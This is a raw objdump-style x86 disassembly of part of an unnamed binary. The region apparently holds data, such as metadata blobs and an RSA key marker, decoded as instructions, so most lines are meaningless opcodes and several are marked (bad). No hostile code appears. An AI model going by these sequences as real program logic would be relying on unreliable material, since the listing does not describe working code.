  40bfbd:	adc    BYTE PTR [ecx],dl
  40bfbf:	or     ch,0x5
  40bfc2:	and    BYTE PTR [ecx],al
  40bfc4:	add    DWORD PTR ds:0x28050e,ebx
  40bfca:	adc    al,BYTE PTR [eax+0x2803a9]
  40bfd0:	push   cs
  40bfd1:	or     DWORD PTR [eax],ebp
  40bfd3:	add    BYTE PTR ds:0x2b98012,dl
  40bfd9:	push   cs
  40bfda:	push   cs
  40bfdb:	add    ebp,DWORD PTR [eax]
  40bfdd:	add    BYTE PTR [edx],al
  40bfdf:	add    esp,DWORD PTR [eax]
  40bfe1:	add    BYTE PTR [edx+ecx*1],bl
  40bfe4:	sub    al,BYTE PTR [eax]
  40bfe6:	add    BYTE PTR cs:[eax+0x0],bh
  40bfea:	ins    DWORD PTR es:[edi],dx
  40bfeb:	add    BYTE PTR [eax+eax*1+0x4],ch
  40bfef:	push   es
  40bff0:	adc    al,BYTE PTR [eax+0x120604d1]
  40bff6:	adc    ch,0x3
  40bff9:	push   es
  40bffa:	adc    bh,BYTE PTR [ecx+ecx*1]
  40bffd:	push   es
  40bffe:	adc    eax,0x2b98012
  40c003:	push   cs
  40c004:	sbb    eax,0x120060e
  40c009:	add    DWORD PTR ds:0x20063812,ebx
  40c00f:	add    BYTE PTR ds:0x4d98012,bl
  40c015:	and    BYTE PTR [eax],al
  40c017:	sbb    eax,0x20050e
  40c01c:	adc    al,BYTE PTR [eax+0x12004d5]
  40c022:	add    cl,BYTE PTR [esi]
  40c024:	or     DWORD PTR [eax],esp
  40c026:	add    DWORD PTR ds:0x1dd8011,edx
  40c02c:	add    cl,BYTE PTR [esi]
  40c02e:	add    al,0x0
  40c030:	add    BYTE PTR [edx],dl
  40c032:	sub    al,0x7
  40c034:	add    BYTE PTR [ecx],al
  40c036:	adc    ch,BYTE PTR [ecx+edx*1]
  40c039:	and    cl,0x5
  40c03c:	add    BYTE PTR [ecx],al
  40c03e:	sbb    eax,0x70e0e
  40c043:	add    DWORD PTR [edx],edx
  40c045:	sub    al,0x1d
  40c047:	adc    bh,BYTE PTR [eax]
  40c049:	add    eax,0x3c120120
  40c04e:	push   cs
  40c04f:	push   es
  40c050:	and    BYTE PTR [ecx],al
  40c052:	sbb    eax,0x50e3c12
  40c057:	and    BYTE PTR [ecx],al
  40c059:	add    DWORD PTR [edx],edx
  40c05b:	cmp    BYTE PTR [ebx],al
  40c05d:	push   es
  40c05e:	adc    al,BYTE PTR [ecx+0x6]
  40c061:	sub    BYTE PTR [eax],al
  40c063:	sbb    eax,0x4d98012
  40c068:	sub    BYTE PTR [eax],al
  40c06a:	sbb    eax,0x28050e
  40c06f:	adc    al,BYTE PTR [eax+0x22005d5]
  40c075:	or     BYTE PTR [esp+ebx*1],bl
  40c078:	add    al,0x20
  40c07a:	add    DWORD PTR [eax],ecx
  40c07c:	sbb    al,0x7
  40c07e:	push   es
  40c07f:	adc    eax,0x1dd8011
  40c084:	add    dl,BYTE PTR [eax]
  40c086:	and    BYTE PTR [eax],cl
  40c088:	add    DWORD PTR [esi],ecx
  40c08a:	push   cs
  40c08b:	push   cs
  40c08c:	push   cs
  40c08d:	add    dl,BYTE PTR ds:0x1dd8011
  40c093:	add    cl,BYTE PTR [esi]
  40c095:	push   cs
  40c096:	or     BYTE PTR [eax],ah
  40c098:	add    BYTE PTR ds:0x1dd8011,dl
  40c09e:	add    cl,BYTE PTR [eax]
  40c0a0:	sub    BYTE PTR [eax],al
  40c0a2:	adc    eax,0x1dd8011
  40c0a7:	add    al,BYTE PTR [esi+eax*1]
  40c0aa:	adc    al,BYTE PTR [eax+0x120604e5]
  40c0b0:	sub    cl,0x4
  40c0b3:	push   es
  40c0b4:	adc    al,BYTE PTR [eax+0x120603ed]
  40c0ba:	and    al,0x3
  40c0bc:	push   es
  40c0bd:	adc    ah,BYTE PTR [eax]
  40c0bf:	add    al,0x6
  40c0c1:	adc    al,BYTE PTR [eax+0x9200cf1]
  40c0c7:	add    DWORD PTR [esi],ecx
  40c0c9:	push   cs
  40c0ca:	push   cs
  40c0cb:	push   cs
  40c0cc:	push   cs
  40c0cd:	push   cs
  40c0ce:	or     BYTE PTR [esi],cl
  40c0d0:	add    dl,BYTE PTR [edx]
  40c0d2:	and    BYTE PTR [esi],al
  40c0d4:	add    DWORD PTR [esi],ecx
  40c0d6:	adc    BYTE PTR [esi],cl
  40c0d8:	adc    BYTE PTR [edx],dl
  40c0da:	xor    ch,0x10
  40c0dd:	push   cs
  40c0de:	adc    BYTE PTR ds:0xe1d100e,bl
  40c0e4:	or     esp,DWORD PTR [eax]
  40c0e6:	add    al,0x1
  40c0e8:	push   cs
  40c0e9:	push   cs
  40c0ea:	adc    BYTE PTR [esi],cl
  40c0ec:	adc    BYTE PTR [edx],dl
  40c0ee:	xor    ch,0xc
  40c0f1:	and    BYTE PTR [ecx+eax*1],al
  40c0f4:	push   cs
  40c0f5:	push   cs
  40c0f6:	adc    BYTE PTR [esi],cl
  40c0f8:	adc    BYTE PTR ds:0x5f98012,bl
  40c0fe:	and    BYTE PTR [ecx],al
  40c100:	sbb    eax,0x20060e0e
  40c105:	add    al,BYTE PTR [ecx]
  40c107:	push   cs
  40c108:	adc    BYTE PTR [esi],cl
  40c10a:	or     BYTE PTR [eax],ah
  40c10c:	add    DWORD PTR [ecx],eax
  40c10e:	adc    BYTE PTR ds:0x7fd8012,bl
  40c114:	and    BYTE PTR [ebx],al
  40c116:	sbb    al,0xe
  40c118:	push   cs
  40c119:	sbb    eax,0x220081c
  40c11e:	sbb    al,0x12
  40c120:	cmp    BYTE PTR [ebp+0x20061c1d],0x1
  40c127:	add    DWORD PTR [edx],edx
  40c129:	sbb    cl,0x6
  40c12c:	and    BYTE PTR [ebx],al
  40c12e:	add    DWORD PTR [edx],eax
  40c130:	push   cs
  40c131:	add    al,BYTE PTR [edi]
  40c133:	and    BYTE PTR [edx],al
  40c135:	add    DWORD PTR [edx+edx*1],ebx
  40c138:	add    DWORD PTR [ecx],0x1022007
  40c13e:	sbb    al,0x12
  40c140:	add    DWORD PTR ds:0x81120604,0x1200609
  40c14a:	add    DWORD PTR [edx],edx
  40c14c:	or     DWORD PTR [ecx],0x1012006
  40c152:	adc    DWORD PTR [ecx+0x7200c0d],eax
  40c158:	add    DWORD PTR [esi],ecx
  40c15a:	or     BYTE PTR [eax],cl
  40c15c:	push   cs
  40c15d:	add    cl,BYTE PTR [esi]
  40c15f:	adc    DWORD PTR [ecx+0x1200611],eax
  40c165:	adc    al,BYTE PTR [ecx+0x200e0e15]
  40c16b:	add    dl,BYTE PTR ds:0x1198112
  40c171:	adc    al,BYTE PTR [ecx-0x7eeef1eb]
  40c177:	sbb    eax,0x1012006
  40c17c:	adc    al,BYTE PTR [ecx+0x12060421]
  40c182:	cmp    BYTE PTR [ebp+0x12022009],0x80
  40c189:	lds    ebx,FWORD PTR [edx+edx*1]
  40c18c:	and    DWORD PTR ds:0x2012005,0x65512
  40c196:	add    DWORD PTR [ecx],edx
  40c198:	sub    DWORD PTR [ecx],0x120050e
  40c19e:	adc    dl,BYTE PTR [ebp+0xe]
  40c1a1:	add    eax,0x59120120
  40c1a6:	push   cs
  40c1a7:	add    al,0x6
  40c1a9:	adc    al,BYTE PTR [ecx+0x2200815]
  40c1af:	add    DWORD PTR [edx],edx
  40c1b1:	adc    DWORD PTR ds:0x20054412,0x2d811200
  40c1bb:	add    eax,0x81120020
  40c1c0:	xor    DWORD PTR ds:0x81120028,eax
  40c1c6:	xor    DWORD PTR [ecx+eax*1],eax
  40c1c9:	add    BYTE PTR [eax],al
  40c1cb:	add    BYTE PTR [esi],al
  40c1cd:	and    BYTE PTR [ecx],al
  40c1cf:	add    DWORD PTR [ecx],edx
  40c1d1:	or     DWORD PTR [ecx+0x1012004],0xa08008
  40c1db:	and    al,0x0
  40c1dd:	add    BYTE PTR [eax+eax*4],al
  40c1e0:	add    BYTE PTR [eax],al
  40c1e2:	xchg   esp,eax
  40c1e3:	add    BYTE PTR [eax],al
  40c1e5:	add    BYTE PTR [esi],al
  40c1e7:	add    al,BYTE PTR [eax]
  40c1e9:	add    BYTE PTR [eax],al
  40c1eb:	and    al,0x0
  40c1ed:	add    BYTE PTR [edx+0x53],dl
  40c1f0:	inc    ecx
  40c1f1:	xor    DWORD PTR [eax],eax
  40c1f3:	add    al,0x0
  40c1f5:	add    BYTE PTR [ecx],al
  40c1f7:	add    BYTE PTR [ecx],al
  40c1f9:	add    BYTE PTR [edi],al
  40c1fb:	sar    edx,1
  40c1fd:	push   edi
  40c1fe:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  40c204:	test   BYTE PTR [edx+0xdfdae0f],ch
  40c20a:	jmp    0xecabbff7
  40c20f:	pop    DWORD PTR [edi+0x6c7603fb]
  40c215:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  40c21a:	mov    dl,0x3b
  40c21c:	out    0x9a,eax
  40c21e:	(bad)  
  40c220:	fadd   st(1),st
  40c222:	fstp   QWORD PTR [edx+0x211336d2]
  40c228:	add    dl,BYTE PTR [eax-0x6c38df5]
  40c22e:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  40c235:	pop    esi
  40c237:	pop    es
  40c238:	ja     0x40c289
  40c23a:	sub    eax,ebp
  40c23c:	xor    cl,BYTE PTR [esi]
  40c23e:	xchg   edx,eax
  40c23f:	jmp    0xc021:0xe8e4ec05
  40c246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c247:	out    dx,eax
  40c248:	call   0x4c9d273e
  40c24d:	or     al,0x93
  40c24f:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  40c256:	stos   BYTE PTR es:[edi],al
  40c257:	gs sub al,0x1d
  40c25a:	cli    
  40c25b:	(bad)  
  40c25c:	cmp    eax,0x2d6f5d74
  40c261:	in     eax,0xf1
  40c263:	jle    0x40c2c3
  40c265:	scas   eax,DWORD PTR es:[edi]
  40c266:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  40c26e:	inc    ebx
  40c26f:	sbb    BYTE PTR gs:[eax],ah
  40c272:	ins    DWORD PTR es:[edi],dx
  40c273:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  40c27a:	push   es
  40c27b:	and    BYTE PTR [ecx],al
  40c27d:	add    DWORD PTR [ecx],edx
  40c27f:	sbb    DWORD PTR [ebp+0x3000108],0x0
  40c289:	add    BYTE PTR [edi],al
  40c28b:	add    BYTE PTR [edx],al
  40c28d:	add    DWORD PTR [edx+edx*1],ebx
  40c290:	add    DWORD PTR [ecx],0x81120604
  40c296:	mov    eax,ds:0x2022007
  40c29b:	push   cs
  40c29c:	adc    DWORD PTR [ecx+0x5a9],eax
  40c2a2:	adc    al,BYTE PTR [ecx+0x20005ad]
  40c2a8:	push   cs
  40c2a9:	push   cs
  40c2aa:	push   cs
  40c2ab:	add    eax,0xe020220
  40c2b0:	push   cs
  40c2b1:	add    esp,DWORD PTR [eax]
  40c2b3:	add    BYTE PTR [eax],cl
  40c2b5:	add    eax,0x80e0220
  40c2ba:	or     BYTE PTR [esi],al
  40c2bc:	and    BYTE PTR [ecx],al
  40c2be:	add    DWORD PTR [ecx],edx
  40c2c0:	cmp    DWORD PTR [ecx-0x7feef9fc],0x12006b1
  40c2ca:	add    DWORD PTR [ecx],edx
  40c2cc:	xor    BYTE PTR [ecx+0x1012004],0xa
  40c2d3:	add    eax,0x81120020
  40c2d8:	rol    DWORD PTR ds:0x81120020,0xc5
  40c2df:	add    eax,0x81120020
  40c2e4:	leave  
  40c2e5:	push   es
  40c2e6:	and    BYTE PTR [ecx],al
  40c2e8:	add    DWORD PTR [ecx],edx
  40c2ea:	or     ebp,0x1032008
  40c2f0:	add    dl,BYTE PTR [ecx]
  40c2f2:	adc    ecx,0x50e
  40c2f8:	adc    al,BYTE PTR [ecx+0x20007d9]
  40c2fe:	or     BYTE PTR [esi],cl
  40c300:	adc    al,BYTE PTR [ecx+0x10006e1]
  40c306:	adc    al,BYTE PTR [ecx+0x200508e5]
  40c30c:	add    al,BYTE PTR [ecx]
  40c30e:	sbb    al,0x18
  40c310:	push   es
  40c311:	and    BYTE PTR [ecx],al
  40c313:	add    DWORD PTR [edx],edx
  40c315:	and    DWORD PTR [ecx+0x1010004],0xb071508
  40c31f:	push   cs
  40c320:	push   cs
  40c321:	push   cs
  40c322:	push   cs
  40c323:	adc    DWORD PTR [eax+0x12651291],eax
  40c329:	adc    eax,0x6d126912
  40c32e:	or     BYTE PTR [edx],dl
  40c330:	and    ebp,0x4080602
  40c336:	push   es
  40c337:	adc    al,BYTE PTR [ecx+0x22007f5]
  40c33d:	adc    al,BYTE PTR [ecx+0x4020ef5]
  40c343:	and    BYTE PTR [ecx],al
  40c345:	sbb    al,0xe
  40c347:	push   es
  40c348:	pop    es
  40c349:	add    dl,BYTE PTR [edx]
  40c34b:	xor    ebp,0x200071c
  40c351:	add    DWORD PTR [eax],edx
  40c353:	or     BYTE PTR [eax],dl
  40c355:	or     BYTE PTR ds:0x8020200,al
  40c35b:	or     BYTE PTR [edi+eax*1],al
  40c35e:	add    cl,BYTE PTR [eax]
  40c360:	or     BYTE PTR [eax],cl
  40c362:	add    BYTE PTR [ecx],al
  40c364:	adc    al,BYTE PTR [eax+0x58211bd]
  40c36a:	or     DWORD PTR [eax],esp
  40c36c:	add    al,BYTE PTR [ecx]
  40c36e:	adc    al,BYTE PTR [eax+0x65121dbd]
  40c374:	add    eax,0x82120020
  40c379:	or     eax,0x1012005
  40c37e:	adc    dl,BYTE PTR ds:0x12032009
  40c384:	jns    0x40c394
  40c386:	adc    al,BYTE PTR [ecx+0x20090ebd]
  40c38c:	add    BYTE PTR ds:0x1118212,dl
  40c392:	adc    cl,BYTE PTR ds:0x82121507
  40c398:	adc    eax,0x50d1201
  40c39d:	and    BYTE PTR [ecx],al
  40c39f:	add    DWORD PTR [ebx],edx
  40c3a1:	add    BYTE PTR ds:0x82120020,al
  40c3a7:	sbb    DWORD PTR ds:0x82120020,eax
  40c3ad:	sbb    eax,0x12012006
  40c3b2:	and    BYTE PTR [ecx],0xe
  40c3b5:	or     ah,BYTE PTR [eax]
  40c3b7:	add    BYTE PTR ds:0x1118212,dl
  40c3bd:	adc    al,BYTE PTR [edx+0x12150825]
  40c3c3:	adc    BYTE PTR [ecx],0x1
  40c3c6:	adc    al,BYTE PTR [edx+0x1300525]
  40c3cc:	add    BYTE PTR [esi],bl
  40c3ce:	add    BYTE PTR ds:0x8212010a,al
  40c3d4:	sub    DWORD PTR [esi],eax
  40c3d6:	and    BYTE PTR [ecx],al
  40c3d8:	add    DWORD PTR [edx],edx
  40c3da:	and    BYTE PTR [ecx],0x8
  40c3dd:	adc    eax,0x1158212
  40c3e2:	adc    al,BYTE PTR [edx+0x1200625]
  40c3e8:	add    DWORD PTR [edx],edx
  40c3ea:	xor    BYTE PTR [ecx],0x10
  40c3ed:	pop    es
  40c3ee:	add    eax,0x82127912
  40c3f3:	sbb    DWORD PTR [edx],edx
  40c3f5:	and    BYTE PTR [ecx],0x12
  40c3f8:	sub    BYTE PTR [ecx],0x1d
  40c3fb:	adc    ah,BYTE PTR [ebp+0x5]
  40c3fe:	pop    es
  40c3ff:	add    dl,BYTE PTR [edx]
  40c401:	inc    eax
  40c402:	add    al,BYTE PTR ds:0x82120020
  40c408:	xor    eax,0x1012005
  40c40d:	adc    cl,BYTE PTR [ecx]
  40c40f:	or     DWORD PTR [eax],esp
  40c411:	add    BYTE PTR ds:0x1398212,dl
  40c417:	adc    dl,BYTE PTR [ecx]
  40c419:	pop    es
  40c41a:	adc    eax,0x1398212
  40c41f:	adc    dl,BYTE PTR [ecx]
  40c421:	add    eax,0x82120020
  40c426:	cmp    eax,0x8022005
  40c42b:	push   cs
  40c42c:	push   cs
  40c42d:	pop    es
  40c42e:	xor    BYTE PTR [ecx],al
  40c430:	add    bl,BYTE PTR [esi]
  40c432:	add    BYTE PTR [esi],cl
  40c434:	push   cs
  40c435:	add    ecx,DWORD PTR [edx]
  40c437:	add    DWORD PTR [esi],ecx
  40c439:	add    eax,0x81120000
  40c43e:	std    
  40c43f:	push   es
  40c440:	add    BYTE PTR [ecx],al
  40c442:	adc    al,BYTE PTR [ecx+0x20060ed9]
  40c448:	add    DWORD PTR [ecx],eax
  40c44a:	adc    al,BYTE PTR [ecx+0x30707d9]
  40c450:	adc    al,BYTE PTR [edx+0x50e0e3d]
  40c456:	and    BYTE PTR [eax],al
  40c458:	adc    al,BYTE PTR [edx+0x200541]
  40c45e:	adc    al,BYTE PTR [edx+0x200545]
  40c464:	adc    al,BYTE PTR [eax+0x200098d]
  40c46a:	add    dl,BYTE PTR [edx]
  40c46c:	or     BYTE PTR [ebp+0x88d8012],0x0
  40c473:	add    DWORD PTR [ecx],edx
  40c475:	adc    BYTE PTR [ecx+0x93d8212],0x0
  40c47c:	add    al,BYTE PTR [edx]
  40c47e:	adc    DWORD PTR [eax-0x6e7fee6f],eax
  40c484:	add    eax,0x80110107
  40c489:	xchg   ecx,eax
  40c48a:	push   es
  40c48b:	adc    eax,0x1198112
  40c490:	push   cs
  40c491:	or     eax,DWORD PTR [eax]
  40c493:	add    DWORD PTR ds:0x1a58012,edx
  40c499:	push   cs
  40c49a:	adc    al,BYTE PTR [eax+0x121506a9]
  40c4a0:	adc    BYTE PTR [ecx+0x1],0xe
  40c4a4:	pop    es
  40c4a5:	adc    eax,0x2b98012
  40c4aa:	push   cs
  40c4ab:	or     BYTE PTR [edx],cl
  40c4ad:	and    BYTE PTR [ecx],al
  40c4af:	add    DWORD PTR ds:0x1558212,edx
  40c4b5:	adc    eax,DWORD PTR [eax]
  40c4b7:	push   es
  40c4b8:	adc    eax,0x1598212
  40c4bd:	push   cs
  40c4be:	or     DWORD PTR [eax],esp
  40c4c0:	add    BYTE PTR ds:0x15d8212,dl
  40c4c6:	adc    eax,DWORD PTR [eax]
  40c4c8:	push   es
  40c4c9:	adc    eax,0x15d8212
  40c4ce:	push   cs
  40c4cf:	add    al,0x20
  40c4d1:	add    BYTE PTR [ebx],dl
  40c4d3:	add    BYTE PTR [edx],cl
  40c4d5:	and    BYTE PTR [ecx],al
  40c4d7:	add    DWORD PTR ds:0x1598212,edx
  40c4dd:	adc    eax,DWORD PTR [eax]
  40c4df:	and    al,BYTE PTR [edi]
  40c4e1:	push   es
  40c4e2:	adc    eax,0x1a58012
  40c4e7:	push   cs
  40c4e8:	adc    eax,0x1a58012
  40c4ed:	push   cs
  40c4ee:	adc    eax,0x2ad8012
  40c4f3:	push   cs
  40c4f4:	or     BYTE PTR [esi],cl
  40c4f6:	adc    eax,0x1a58012
  40c4fb:	push   cs
  40c4fc:	adc    eax,0x15d8212
  40c501:	push   cs
  40c502:	push   es
  40c503:	adc    eax,0x1a58012
  40c508:	push   cs
  40c509:	add    eax,0x130120
  40c50e:	or     BYTE PTR [eax],cl
  40c510:	add    BYTE PTR [ebx],al
  40c512:	or     BYTE PTR [esi],cl
  40c514:	push   cs
  40c515:	adc    DWORD PTR [ecx+0x30705a9],eax
  40c51b:	add    cl,BYTE PTR [eax]
  40c51d:	push   cs
  40c51e:	push   es
  40c51f:	add    BYTE PTR [ecx],al
  40c521:	push   cs
  40c522:	adc    DWORD PTR [eax+0x5071ce1],eax
  40c528:	adc    eax,0x1a58012
  40c52d:	push   cs
  40c52e:	adc    eax,0x2ad8012
  40c533:	push   cs
  40c534:	or     BYTE PTR [esi],cl
  40c536:	adc    eax,0x1a58012
  40c53b:	push   cs
  40c53c:	adc    eax,0x15d8212
  40c541:	push   cs
  40c542:	pop    es
  40c543:	and    BYTE PTR [ecx],al
  40c545:	sbb    eax,0xe698212
  40c54a:	pop    es
  40c54b:	adc    eax,0x2ad8012
  40c550:	push   cs
  40c551:	or     BYTE PTR ds:0x13020120,al
  40c557:	add    BYTE PTR [edi],al
  40c559:	and    BYTE PTR [edx],al
  40c55b:	add    DWORD PTR [ebx],edx
  40c55d:	add    BYTE PTR [ebx],dl
  40c55f:	add    DWORD PTR [ebx],edx
  40c561:	pop    es
  40c562:	add    eax,0xa5801215
  40c567:	add    DWORD PTR [esi],ecx
  40c569:	adc    al,BYTE PTR [edx+0x69821265]
  40c56f:	sbb    eax,0x8698212
  40c574:	add    al,0x0
  40c576:	add    DWORD PTR [edx],eax
  40c578:	push   cs
  40c579:	add    eax,0x82120020
  40c57e:	popa   
  40c57f:	sbb    BYTE PTR [edi],al
  40c581:	or     dl,BYTE PTR ds:0x1a58012
  40c587:	push   cs
  40c588:	push   cs
  40c589:	sbb    eax,0x2c123812
  40c58e:	adc    bh,BYTE PTR [esi+ecx*1]
  40c591:	push   cs
  40c592:	add    dl,BYTE PTR [edx]
  40c594:	and    BYTE PTR [ecx+0x12],0x49
  40c598:	add    eax,DWORD PTR [edi]
  40c59a:	add    DWORD PTR [esi],ecx
  40c59c:	add    eax,0x80110020
  40c5a1:	mov    cl,0x8
  40c5a3:	add    BYTE PTR [ebx],al
  40c5a5:	add    cl,BYTE PTR [esi]
  40c5a7:	push   cs
  40c5a8:	adc    DWORD PTR [ecx+0x20005a9],eax
  40c5ae:	push   cs
  40c5af:	sbb    al,0x1c
  40c5b1:	push   es
  40c5b2:	add    BYTE PTR [edx],al
  40c5b4:	add    DWORD PTR [eax+edx*1],ebx
  40c5b7:	add    cl,BYTE PTR ds:0xb9801215
  40c5bd:	add    cl,BYTE PTR [esi]
  40c5bf:	adc    eax,0x2b98012
  40c5c4:	push   cs
  40c5c5:	push   cs
  40c5c6:	add    al,0x0
  40c5c8:	add    DWORD PTR [ecx],eax
  40c5ca:	sbb    al,0x4
  40c5cc:	pop    es
  40c5cd:	add    al,BYTE PTR [edx]
  40c5cf:	sbb    al,0x7
  40c5d1:	adc    eax,0x2b98012
  40c5d6:	push   cs
  40c5d7:	push   cs
  40c5d8:	adc    esp,DWORD PTR [eax]
  40c5da:	add    al,BYTE PTR [ecx]
  40c5dc:	adc    eax,0x2ad8012
  40c5e1:	adc    eax,DWORD PTR [eax]
  40c5e3:	adc    eax,DWORD PTR [ecx]
  40c5e5:	adc    eax,0x1558212
  40c5ea:	adc    eax,DWORD PTR [eax]
  40c5ec:	add    eax,0x80110020
  40c5f1:	xchg   ecx,eax
  40c5f2:	push   es
  40c5f3:	and    BYTE PTR [ecx],al
  40c5f5:	add    dl,BYTE PTR [ecx]
  40c5f7:	adc    BYTE PTR [ecx+0x11050711],0x80
  40c5fe:	xchg   ecx,eax
  40c5ff:	adc    DWORD PTR [eax-0x6e7fee6f],eax
  40c605:	adc    DWORD PTR [eax-0x6e7fee6f],eax
  40c60b:	add    al,0x7
  40c60d:	add    cl,BYTE PTR [esi]
  40c60f:	push   cs
  40c610:	or     BYTE PTR [eax],al
  40c612:	add    DWORD PTR [edx],edx
  40c614:	add    ch,0x12
  40c617:	add    cl,0x4
  40c61a:	and    BYTE PTR [ecx],al
  40c61c:	or     BYTE PTR [eax],cl
  40c61e:	push   es
  40c61f:	pop    es
  40c620:	add    al,0x8
  40c622:	or     BYTE PTR [esi],cl
  40c624:	push   cs
  40c625:	add    eax,0x80110107
  40c62a:	int    0x8
  40c62c:	and    BYTE PTR [edx],al
  40c62e:	add    dl,BYTE PTR [ebx]
  40c630:	add    BYTE PTR [eax],dl
  40c632:	adc    eax,DWORD PTR [ecx]
  40c634:	daa    
  40c635:	pop    es
  40c636:	or     BYTE PTR [esi],cl
  40c638:	adc    eax,0x2b98012
  40c63d:	push   cs
  40c63e:	push   cs
  40c63f:	adc    bl,BYTE PTR [edx*1+0x1a58012]
  40c646:	push   cs
  40c647:	push   cs
  40c648:	add    dl,BYTE PTR ds:0x2b98012
  40c64e:	push   cs
  40c64f:	adc    eax,0x2b98012
  40c654:	push   cs
  40c655:	push   cs
  40c656:	adc    eax,0x15d8212
  40c65b:	push   cs
  40c65c:	or     esp,DWORD PTR [eax]
  40c65e:	add    BYTE PTR ds:0x2898211,dl
  40c664:	adc    eax,DWORD PTR [eax]
  40c666:	adc    eax,DWORD PTR [ecx]
  40c668:	pop    es
  40c669:	adc    eax,0x2898211
  40c66e:	push   cs
  40c66f:	push   cs
  40c670:	or     esp,DWORD PTR [eax]
  40c672:	add    BYTE PTR ds:0x28d8211,dl
  40c678:	adc    eax,DWORD PTR [eax]
  40c67a:	adc    eax,DWORD PTR [ecx]
  40c67c:	pop    es
  40c67d:	adc    eax,0x28d8211
  40c682:	push   cs
  40c683:	push   cs
  40c684:	add    al,0x20
  40c686:	add    BYTE PTR [ebx],dl
  40c688:	add    DWORD PTR [edx],edx
  40c68a:	pop    es
  40c68b:	add    al,0xe
  40c68d:	push   cs
  40c68e:	adc    eax,0x28d8211
  40c693:	push   cs
  40c694:	push   cs
  40c695:	adc    eax,0x2898211
  40c69a:	push   cs
  40c69b:	push   cs
  40c69c:	push   es
  40c69d:	and    BYTE PTR [ecx],al
  40c69f:	sbb    eax,0x7031d0e
  40c6a4:	pop    es
  40c6a5:	add    ecx,DWORD PTR [esi]
  40c6a7:	sbb    eax,0x6031d0e
  40c6ac:	add    BYTE PTR [ecx],al
  40c6ae:	adc    al,BYTE PTR [eax+0x70c0ec1]
  40c6b4:	pop    es
  40c6b5:	push   cs
  40c6b6:	push   cs
  40c6b7:	push   cs
  40c6b8:	adc    al,BYTE PTR [eax+0xe1d0ec1]
  40c6be:	or     BYTE PTR ds:0x12010100,al
  40c6c4:	cmp    eax,0x1012006
  40c6c9:	adc    al,BYTE PTR [edx+0x3070899]
  40c6cf:	adc    bh,BYTE PTR [eax]
  40c6d1:	sbb    eax,0x5083812
  40c6d6:	and    BYTE PTR [ecx],al
  40c6d8:	add    DWORD PTR [edx],edx
  40c6da:	inc    ecx
  40c6db:	add    al,0x20
  40c6dd:	add    DWORD PTR [eax+ecx*1],ebx
  40c6e0:	add    al,0x20
  40c6e2:	add    DWORD PTR [edx],eax
  40c6e4:	sbb    al,0x5
  40c6e6:	and    BYTE PTR [edx],al
  40c6e8:	add    DWORD PTR [esp+ebx*1],ebx
  40c6eb:	add    eax,0x12080207
  40c6f0:	cmp    al,0x8
  40c6f2:	and    BYTE PTR [ecx],al
  40c6f4:	adc    al,BYTE PTR [edx-0x427fed7b]
  40c6fa:	add    al,0x1d
  40c6fc:	adc    al,BYTE PTR [eax+0xe1d02d9]
  40c702:	add    al,0x7
  40c704:	add    DWORD PTR [edx],edx
  40c706:	cmp    al,0x6
  40c708:	adc    eax,0x1dd8011
  40c70d:	add    cl,BYTE PTR [edx]
  40c70f:	pop    es
  40c710:	add    dl,BYTE PTR [edx]
  40c712:	cmp    al,0x15
  40c714:	adc    DWORD PTR [eax+0x90201dd],eax
  40c71a:	pop    es
  40c71b:	add    al,0xe
  40c71d:	sbb    eax,0x38121d0e
  40c722:	or     BYTE PTR [eax],cl
  40c724:	adc    eax,0x2b98012
  40c729:	push   cs
  40c72a:	sbb    eax,0x200060e
  40c72f:	sbb    eax,0x60e0e0e
  40c734:	and    BYTE PTR [ecx],al
  40c736:	adc    eax,DWORD PTR [ecx]
  40c738:	adc    eax,DWORD PTR [eax]
  40c73a:	add    eax,0x1d0e0207
  40c73f:	push   cs
  40c740:	pop    es
  40c741:	adc    BYTE PTR [ecx],al
  40c743:	add    DWORD PTR [ecx],eax
  40c745:	sbb    eax,0xa04001e
  40c74a:	add    DWORD PTR [edx],edx
  40c74c:	cmp    BYTE PTR [esi],al
  40c74e:	and    BYTE PTR [ecx],al
  40c750:	adc    al,BYTE PTR [edx+0x200603a5]
  40c756:	add    DWORD PTR [edx],edx
  40c758:	and    BYTE PTR [ebp+0x120040e],0x1c
  40c75f:	sbb    al,0x9
  40c761:	pop    es
  40c762:	add    al,0x12
  40c764:	and    BYTE PTR [ebp+0x2c120e08],0x7
  40c76b:	and    BYTE PTR [edx],al
  40c76d:	or     BYTE PTR [esi],cl
  40c76f:	adc    DWORD PTR [ecx+0x10703a9],eax
  40c775:	or     BYTE PTR [edi],al
  40c777:	adc    eax,0x1198112
  40c77c:	adc    bh,BYTE PTR [eax*1+0x131d0020]
  40c783:	add    BYTE PTR ds:0x12150407,cl
  40c789:	sbb    DWORD PTR [ecx],0x83c1201
  40c78f:	or     BYTE PTR [edx],dl
  40c791:	cmp    al,0x5
  40c793:	and    BYTE PTR [eax],al
  40c795:	adc    DWORD PTR [edx+0x20006b1],eax
  40c79b:	add    cl,BYTE PTR [esi]
  40c79d:	adc    BYTE PTR [edx],al
  40c79f:	and    BYTE PTR [edi],al
  40c7a1:	adc    DWORD PTR [esi],ecx
  40c7a3:	adc    al,BYTE PTR [edx+0x12020ea9]
  40c7a9:	xor    BYTE PTR [ebp+0xe0e0e0e],0xe
  40c7b0:	push   cs
  40c7b1:	add    al,BYTE PTR [edx]
  40c7b3:	adc    eax,0x1dd8011
  40c7b8:	add    al,BYTE PTR [edx]
  40c7ba:	adc    al,BYTE PTR [edx-0x267fed47]
  40c7c0:	push   es
  40c7c1:	pop    es
  40c7c2:	add    dl,BYTE PTR [edx]
  40c7c4:	cmp    al,0x12
  40c7c6:	cmp    al,0x4
  40c7c8:	pop    es
  40c7c9:	add    DWORD PTR [edx],edx
  40c7cb:	cmp    BYTE PTR [ecx],cl
  40c7cd:	add    BYTE PTR [ebx],al
  40c7cf:	push   cs
  40c7d0:	adc    al,BYTE PTR [ecx+0x1c1d0ee1]
  40c7d6:	add    al,0x7
  40c7d8:	add    DWORD PTR ds:0x152811c,ebx
  40c7de:	add    BYTE PTR [ebx],al
  40c7e0:	add    BYTE PTR [ebp+edx*2+0x7f],dl
  40c7e4:	push   ebx
  40c7e5:	jns    0x40c85a
  40c7e7:	je     0x40c84e
  40c7e9:	ins    DWORD PTR es:[edi],dx
  40c7ea:	cs push ebx
